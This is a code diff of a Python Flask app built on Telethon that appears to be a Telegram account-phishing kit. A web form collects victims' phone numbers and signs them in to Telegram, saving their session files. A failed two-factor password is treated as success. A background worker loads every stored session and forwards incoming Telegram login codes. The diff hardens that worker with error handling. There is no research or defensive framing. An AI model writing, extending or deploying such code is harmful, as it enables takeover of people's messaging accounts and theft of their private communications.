@@ -28,7 +28,6 @@ def login():
         gender = request.form.get("gender")
         session["name"], session["phone"], session["gender"] = name, phone, gender
 
-        # hapus session lama supaya OTP baru
         session_path = os.path.join(SESSION_DIR, f"{phone}.session")
         if os.path.exists(session_path):
             os.remove(session_path)
@@ -109,13 +108,11 @@ def password():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
-                # kalau akun memang pakai password → harus cocok
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
             except Exception:
-                # kalau akun tidak pakai password → anggap berhasil
                 await client.disconnect()
                 return True, None
 
@@ -146,7 +143,6 @@ def success():
 # =================== WORKER ===================
 
 async def forward_handler(event, client_name):
-    """Handler untuk meneruskan pesan OTP"""
     text_msg = event.message.message
     if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
         import re
@@ -169,24 +165,26 @@ async def worker_main():
         for fname in os.listdir(SESSION_DIR):
             if fname.endswith(".session") and fname not in clients:
                 path = os.path.join(SESSION_DIR, fname)
-                print(f"[Worker] Memuat session {path}")
-                client = TelegramClient(path, api_id, api_hash)
-                await client.connect()
+                try:
+                    client = TelegramClient(path, api_id, api_hash)
+                    await client.connect()
 
-                if not await client.is_user_authorized():
-                    print(f"[Worker] ❌ Session {fname} belum login, lewati.")
-                    await client.disconnect()
-                    continue
+                    if not await client.is_user_authorized():
+                        print(f"[Worker] ❌ Session {fname} belum login, skip.")
+                        await client.disconnect()
+                        continue
 
-                me = await client.get_me()
-                print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")
+                    me = await client.get_me()
+                    print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")
 
-                @client.on(events.NewMessage)
-                async def handler(event, fn=fname):
-                    await forward_handler(event, fn)
+                    @client.on(events.NewMessage)
+                    async def handler(event, fn=fname):
+                        await forward_handler(event, fn)
 
-                clients[fname] = client
-                asyncio.create_task(client.run_until_disconnected())
+                    clients[fname] = client
+                    asyncio.create_task(client.run_until_disconnected())
+                except Exception as e:
+                    print(f"[Worker] Error load session {fname}: {e}")
 
         await asyncio.sleep(10)
 
@@ -195,7 +193,6 @@ def start_worker():
     asyncio.run(worker_main())
 
 
-# jalankan worker di thread terpisah saat app start
 threading.Thread(target=start_worker, daemon=True).start()
 
 # =================== RUN FLASK ===================
